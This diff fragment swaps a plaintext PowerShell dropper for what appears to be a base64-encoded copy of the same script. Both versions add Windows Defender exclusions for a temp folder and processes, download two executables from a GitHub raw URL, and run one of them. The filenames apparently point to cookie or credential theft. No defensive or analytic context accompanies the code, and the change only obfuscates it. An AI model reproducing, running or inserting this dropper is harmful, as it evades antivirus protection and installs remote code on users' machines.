@@ -1,17 +1,1 @@
-$systemPath = [System.IO.Path]::Combine($env:temp, "System")
-New-Item -Path $systemPath -ItemType Directory -Force
-try {
-Add-MpPreference -ExclusionPath $systemPath
-} catch {}
-$cookieUrl = "https://raw.githubusercontent.com/blackcodeit407/system/main/cookie.txt"
-$cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")
-Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
-try {
-Add-MpPreference -ExclusionProcess $cookiePath
-} catch {}
-$getfileUrl = "https://raw.githubusercontent.com/blackcodeit407/system/main/noname.txt"
-$getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")
-Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
-try {
-Add-MpPreference -ExclusionProcess $getfilePath
-Start-Process -FilePath $cookiePath -ArgumentList "-Bypass"
+JHN5c3RlbVBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6dGVtcCwgIlN5c3RlbSIpCk5ldy1JdGVtIC1QYXRoICRzeXN0ZW1QYXRoIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlCnRyeSB7CkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHN5c3RlbVBhdGgKfSBjYXRjaCB7fQokY29va2llVXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ibGFja2NvZGVpdDQwNy9zeXN0ZW0vbWFpbi9jb29raWUudHh0IgokY29va2llUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkNvbWJpbmUoJHN5c3RlbVBhdGgsICJjb29raWUuZXhlIikKSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkY29va2llVXJsIC1PdXRGaWxlICRjb29raWVQYXRoCnRyeSB7CkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJGNvb2tpZVBhdGgKfSBjYXRjaCB7fQokZ2V0ZmlsZVVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmxhY2tjb2RlaXQ0MDcvc3lzdGVtL21haW4vbm9uYW1lLnR4dCIKJGdldGZpbGVQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkc3lzdGVtUGF0aCwgImdldGZpbGUuZXhlIikKSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkZ2V0ZmlsZVVybCAtT3V0RmlsZSAkZ2V0ZmlsZVBhdGgKdHJ5IHsKQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAkZ2V0ZmlsZVBhdGgKU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJGNvb2tpZVBhdGggLUFyZ3VtZW50TGlzdCAiLUJ5cGFzcyI=
